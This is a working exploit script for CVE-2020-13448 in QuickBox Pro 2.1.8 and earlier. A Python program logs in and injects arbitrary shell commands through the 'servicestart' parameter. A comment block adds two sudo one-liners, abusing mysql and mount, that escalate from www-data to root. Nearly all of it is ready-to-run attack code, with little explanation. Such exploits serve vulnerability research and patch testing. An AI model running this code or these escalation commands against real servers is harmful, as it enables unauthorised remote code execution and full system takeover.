# Exploit Author: s1gh
# Vendor Homepage: https://quickbox.io/
# Vulnerability Details: https://s1gh.sh/cve-2020-13448-quickbox-authenticated-rce/
# Version: <= 2.1.8
# Description: An authenticated low-privileged user can exploit a command injection vulnerability to get code-execution as www-data and escalate privileges to root due to weak sudo rules.
# Tested on: Debian 9
# CVE: CVE-2020-13448
# References: https://github.com/s1gh/QuickBox-Pro-2.1.8-Authenticated-RCE

&#039;&#039;&#039;
Privilege escalation: After getting a reverse shell as the www-data user you can escalate to root in one of two ways.
1. sudo mysql -e &#039;\! /bin/sh&#039;
2. sudo mount -o bind /bin/sh /bin/mount;sudo mount

&#039;&#039;&#039;

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote_plus

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(args):
    s = requests.Session()
    print(&#039;[*] Sending our payload...&#039;)

    s.post(&#039;https://&#039; + args.ip + &#039;/inc/process.php&#039;, data={&#039;username&#039;: args.username, &#039;password&#039;: args.password, &#039;form_submission&#039;: &#039;login&#039;}, verify=False)
    try:
        s.get(&#039;https://&#039; + args.ip + &#039;/index.php?id=88&servicestart=a;&#039; + quote_plus(args.cmd) + &#039;;&#039;, verify=False)
    except requests.exceptions.ReadTimeout:
        pass

def main():
    parser = argparse.ArgumentParser(description="Authenticated RCE for QuickBox Pro <= v2.1.8")
    parser.add_argument(&#039;-i&#039;,dest=&#039;ip&#039;,required=True,help="Target IP Address")
    parser.add_argument(&#039;-u&#039;,dest=&#039;username&#039;,required=True,help="Username")
    parser.add_argument(&#039;-p&#039;,dest=&#039;password&#039;,required=True,help="Password")
    parser.add_argument(&#039;-c&#039;,dest=&#039;cmd&#039;, required=True, help="Command to execute")
    args = parser.parse_args()

    exploit(args)


if __name__ == &#039;__main__&#039;:
    main()
    sys.exit(0)

